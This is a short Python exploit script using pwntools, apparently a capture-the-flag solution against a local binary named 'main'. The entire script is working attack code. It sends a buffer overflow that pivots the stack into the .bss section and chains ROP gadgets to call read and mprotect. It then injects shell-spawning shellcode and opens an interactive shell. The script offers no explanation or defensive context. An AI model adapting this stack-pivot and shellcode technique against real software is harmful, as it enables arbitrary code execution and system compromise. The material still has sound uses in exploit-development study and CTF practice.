from pwn import*
context.log_level = 'DEBUG'
context.arch = 'AMD64'
p = process('./main')
elf =ELF('./main')
pop_rsi_r15 = 0x401309
pop_rbp_ret = 0x401179
leave_ret = 0x401285
mprotect = 0x40126D
payload = 'U'*0x20 + p64(elf.bss()) + p64(pop_rsi_r15) + p64(elf.bss()) + p64(0) + p64(elf.plt['read']) + p64(leave_ret)
p.send(payload)
payload_II  = 'U'*8 + p64(pop_rbp_ret) + p64(elf.bss() + 0x24 + 12) + p64(mprotect) + 'UUUU' + p64(elf.bss()&0xFFFFF000)
payload_II += 'U'*12 + p64(elf.sym['input'])
p.sendline(payload_II)
p.sendline('U'*0x28 + p64(pop_rsi_r15) + p64(elf.bss()+0x60) + p64(0) + p64(elf.plt['read']))
p.sendline(p64(elf.bss() + 0x68) + asm(shellcraft.sh()))
p.interactive()
